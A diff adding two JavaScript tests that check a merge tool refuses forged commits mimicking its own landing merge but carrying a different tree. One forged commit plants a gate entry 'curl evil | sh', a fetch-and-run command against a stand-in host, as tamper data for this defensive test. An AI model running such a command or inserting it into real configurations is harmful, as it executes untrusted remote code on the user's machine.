@@ -2113,6 +2113,57 @@ test('A15 landing: forge git, a merge on main that someone else made (another me
   } finally { T.done(); }
 });
 
+test('A15 landing: forge git, a merge on main with the kit\'s parents and message but another tree (a gate, a file) is never adopted: nothing is logged, and merge refuses (final-14 F1)', () => {
+  const T = setup('a15-lookalike');
+  try {
+    const q = T.yes({ recurring: { aa: check() } });
+    const wt = T.jobsChore('hand', () => ({ aa: check() }));
+    const sha = T.g(['rev-parse', 'HEAD'], wt);
+    T.g(['fetch', '-q', 'origin']);
+    const main0 = T.g(['rev-parse', 'origin/main']);
+    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
+    T.edit((j) => { j.gates = { ...(j.gates ?? {}), evil: 'curl evil | sh' }; }, wt);
+    write(path.join(wt, 'src/evil.js'), 'evil\n');
+    T.g(['add', '-A'], wt);
+    const evil = T.g(['commit-tree', T.g(['write-tree'], wt), '-p', main0, '-p', sha, '-m', KIT_MSG]);
+    T.g(['push', '-q', '-f', 'origin', `${evil}:refs/heads/main`]); T.g(['fetch', '-q', 'origin']);
+    const before = T.acts().length;
+    const r = T.merge('hand', ['--approved', q]);
+    refused(r, new RegExp(`main's tip ${evil.slice(0, 12)} has the kit's landing message and parents, but not the tree the kit's merge of them builds: not the kit's own landing; nothing logged`));
+    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
+    assert.equal(T.acts().length, before, 'nothing logged');
+    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
+  } finally { T.done(); }
+});
+
+test('A15 landing: records in home, a merge on home\'s main with the kit\'s records parents and message but another tree is never adopted: nothing is logged, and merge refuses (final-14 F1)', () => {
+  const F = recordsHome('recur-rec-lookalike');
+  try {
+    const { head } = recordsReady(F, RID);
+    const main0 = F.mainNow();
+    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
+    const msg = `${RID}: records\n\nMerged home's ticket/${RID} at ${head}: the records of ${RID}, whose code lands in console`;
+    // a look-alike: the merge's tree and one file more outside the ticket's folder (one that adds a job is
+    // refused before this, by the records checks: final-14 H14-4)
+    const lookalike = (n, fn) => {
+      const m = path.join(F.old, '.worktrees', `lookalike-${n}`);
+      F.g(['worktree', 'add', '-q', '--detach', m, main0], F.old);
+      F.g(['merge', '-q', '--no-ff', '--no-commit', head], m);
+      fn(m);
+      F.g(['add', '-A'], m);
+      const c = F.g(['commit-tree', F.g(['write-tree'], m), '-p', main0, '-p', head, '-m', msg], m);
+      F.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`], m);
+      return c;
+    };
+    const c = lookalike('notes', (m) => write(path.join(m, `${PROJ}/notes-evil.md`), 'evil\n'));
+    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
+    assert.notEqual(r.status, 0, r.text);
+    assert.match(r.text, new RegExp(`home's main tip ${c.slice(0, 12)} has the kit's records message and parents, but not the tree the kit's merge of them builds: not the kit's own records merge; nothing logged`));
+    assert.doesNotMatch(r.text, /in the kit's own records merge/);
+    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
+  } finally { F.done(); }
+});
+
 test('A15 landing: forge git, with commit.cleanup=strip in the repo\'s config, a code push killed at the timeout is still recognised as the kit\'s own landing on the rerun (final-14 F3)', { timeout: 300000 }, () => {
   const T = setup('a15-cleanup');
   try {
